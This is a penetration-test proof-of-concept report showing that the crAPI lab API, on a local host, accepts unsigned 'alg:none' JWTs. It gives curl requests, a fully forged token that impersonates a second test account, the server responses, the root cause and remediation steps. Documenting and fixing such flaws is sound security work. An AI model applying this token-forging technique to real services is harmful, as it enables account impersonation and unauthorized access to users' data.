# Proof of Concept: JWT `alg:none` Authentication Bypass

## 1. Vulnerability Summary

The crAPI Identity API accepts JSON Web Tokens (JWTs) using the `alg:none` algorithm without requiring a valid cryptographic signature.

An attacker who can obtain a legitimate JWT can modify the token's claims, change the algorithm to `none`, remove the signature, and submit the modified token to authenticated API endpoints.

During testing, this behavior was demonstrated to allow **identity impersonation**: a JWT originally belonging to Test Account A was modified to identify Test Account B, and the API returned Test Account B's authenticated dashboard without a valid signature.

**Severity:** Critical

**Primary CWE:** CWE-347 — Improper Verification of Cryptographic Signature

**Related weakness:** JWT algorithm/signature validation failure

**Affected endpoint:**

```text
GET /identity/api/v2/user/dashboard
```

**Affected host:**

```text
http://127.0.0.1:30080
```

---

# 2. Preconditions

The following were available during testing:

1. Two controlled crAPI accounts:

   * Test Account A
   * Test Account B

2. A valid JWT belonging to Test Account A.

3. A valid JWT belonging to Test Account B.

No private RSA signing key was required to perform the demonstrated attack.

---

# 3. Legitimate JWT Configuration

The legitimate JWT issued by crAPI uses:

```json
{
  "alg": "RS256"
}
```

The JWT payload for Test Account A was:

```json
{
  "sub": "test-a@mail.com",
  "iat": 1791285727,
  "exp": 1791890527,
  "role": "user"
}
```

The JWT payload for Test Account B was:

```json
{
  "sub": "test-b@mail.com",
  "iat": 1791285506,
  "exp": 1791890306,
  "role": "user"
}
```

The application also exposes an RSA JWKS endpoint:

```text
GET /.well-known/jwks.json
```

which advertises an RS256 signing key.

Therefore, legitimate JWTs are expected to be cryptographically validated using RS256.

---

# 4. Step 1 — Establish Test Account B Baseline

A legitimate JWT issued to Test Account B was submitted to:

```text
GET /identity/api/v2/user/dashboard
```

Request:

```bash
curl -s \
  'http://127.0.0.1:30080/identity/api/v2/user/dashboard' \
  -H "Authorization: Bearer $JWT_B"
```

The application returned:

```json
{
  "id": 14,
  "name": "TestB",
  "email": "test-b@mail.com",
  "number": "9378396062",
  "picture_url": null,
  "video_url": null,
  "video_name": null,
  "available_credit": 100.0,
  "video_id": 0,
  "role": "ROLE_USER"
}
```

This establishes the legitimate identity and server-side account associated with:

```text
test-b@mail.com
```

---

# 5. Step 2 — Establish Test Account A

A legitimate JWT belonging to Test Account A contained:

```json
{
  "sub": "test-a@mail.com",
  "iat": 1791285727,
  "exp": 1791890527,
  "role": "user"
}
```

The token was legitimately signed using:

```text
RS256
```

The JWT was used as the starting point for the attack.

---

# 6. Step 3 — Modify the JWT Algorithm

The original JWT header was:

```json
{
  "alg": "RS256"
}
```

It was modified to:

```json
{
  "alg": "none",
  "typ": "JWT"
}
```

The payload was modified from:

```json
{
  "sub": "test-a@mail.com",
  "iat": 1791285727,
  "exp": 1791890527,
  "role": "user"
}
```

to:

```json
{
  "sub": "test-b@mail.com",
  "iat": 1791285727,
  "exp": 1791890527,
  "role": "user"
}
```

The signature was completely removed.

The resulting JWT therefore had the following structure:

```text
BASE64URL(HEADER).BASE64URL(PAYLOAD).
```

The final period represents an empty signature.

The resulting forged JWT was:

```text
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ0ZXN0LWJAbWFpbC5jb20iLCJpYXQiOjE3OTEyODU3MjcsImV4cCI6MTc5MTg5MDUyNywicm9sZSI6InVzZXIifQ.
```

---

# 7. Step 4 — Submit the Forged JWT

The forged JWT was supplied to the protected dashboard endpoint:

```bash
curl -i -s \
  'http://127.0.0.1:30080/identity/api/v2/user/dashboard' \
  -H "Authorization: Bearer $FORGED_JWT"
```

The server responded:

```text
HTTP/1.1 200
```

and returned:

```json
{
  "id": 14,
  "name": "TestB",
  "email": "test-b@mail.com",
  "number": "9378396062",
  "picture_url": null,
  "video_url": null,
  "video_name": null,
  "available_credit": 100.0,
  "video_id": 0,
  "role": "ROLE_USER"
}
```

---

# 8. Critical Evidence

The important distinction is that the successful request did **not** contain Test Account B's legitimate JWT.

Instead, the token was:

```text
alg = none
```

and contained:

```text
sub = test-b@mail.com
```

with:

```text
signature = empty
```

Nevertheless, crAPI returned Test Account B's authenticated information.

The resulting attack flow was:

```text
Legitimate Account A JWT
        |
        v
Change alg RS256 -> none
        |
        v
Change sub:
test-a@mail.com
        |
        v
test-b@mail.com
        |
        v
Remove JWT signature
        |
        v
Submit forged JWT
        |
        v
crAPI accepts token
        |
        v
Account B authenticated context
        |
        v
Account B dashboard returned
```

---

# 9. Why This Demonstrates Impact

This is not merely a malformed-token or parser test.

The attacker successfully changed the identity represented by the JWT from:

```text
test-a@mail.com
```

to:

```text
test-b@mail.com
```

without possessing Test Account B's legitimate JWT or the RSA private signing key.

The API subsequently returned Test Account B's authenticated data.

Therefore, the application is effectively trusting attacker-controlled JWT claims without requiring a valid cryptographic signature.

An attacker capable of obtaining any valid JWT could potentially forge authentication tokens for other users if their identifiers can be determined or manipulated.

---

# 10. Security Impact

Successful exploitation can result in:

* Authentication bypass
* User impersonation
* Unauthorized access to another user's account context
* Unauthorized access to user-specific API resources
* Potential exposure or modification of sensitive user data
* Potential privilege escalation if authorization claims are trusted
* Potential account takeover depending on the functionality exposed through authenticated endpoints

The exact maximum impact depends on which crAPI endpoints rely on the affected JWT validation mechanism.

---

# 11. Evidence Summary

| Test                           | Result                       |
| ------------------------------ | ---------------------------- |
| Legitimate Account B RS256 JWT | Account B dashboard returned |
| Account A legitimate JWT       | Account A identity           |
| Change `alg` to `none`         | Accepted                     |
| Remove JWT signature           | Accepted                     |
| Change `sub` to Account B      | Accepted                     |
| Resulting identity             | Account B                    |
| Account B dashboard returned   | **Yes**                      |
| RSA private key required       | **No**                       |

The key proof is:

```text
Unsigned JWT + modified identity
              ↓
         HTTP 200
              ↓
     Account B's data
```

---

# 12. Root Cause

The application appears to derive authentication from attacker-controlled JWT claims while failing to enforce the expected cryptographic algorithm and signature validation.

The JWT `alg` header is attacker-controlled input and must never be treated as sufficient authority to disable signature verification.

The application should explicitly configure the expected signing algorithm rather than accepting an algorithm specified by the token itself.

---

# 13. Remediation

The JWT verification implementation should:

1. **Explicitly require RS256** (or the intended signing algorithm).

2. **Reject `alg:none` unconditionally**.

3. Verify the JWT signature before processing authentication or authorization claims.

4. Do not allow the token's `alg` header to determine whether signature verification is performed.

5. Validate the expected signing key based on a trusted key configuration/JWKS.

6. Validate standard claims including:

   * `iss`
   * `aud`
   * `exp`
   * `nbf`, where applicable

7. Ensure authorization decisions are based on a server-side authenticated identity rather than blindly trusting attacker-controlled claims.

8. Add automated tests covering:

   * `alg:none`
   * Invalid signatures
   * Algorithm substitution
   * Modified `sub`
   * Modified authorization claims
   * Invalid/unknown `kid`

---

# 14. Recommended Retest

After remediation, repeat the exact PoC.

The forged token:

```text
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.<modified-payload>.
```

should result in an authentication failure, for example:

```text
401 Unauthorized
```

and must **not** return Test Account B's dashboard.

The legitimate RS256 token should continue to authenticate successfully.

---

# 15. Conclusion

The crAPI Identity API was demonstrated to accept a JWT with:

```text
alg = none
```

and an empty signature.

Furthermore, the JWT's `sub` claim was changed from Test Account A to Test Account B, after which the application returned Test Account B's authenticated dashboard.

This demonstrates a practical **JWT signature validation bypass resulting in user impersonation**.

The issue should therefore be treated as a **high-severity authentication vulnerability**, with final severity depending on the additional authenticated functionality accessible through the affected JWT.
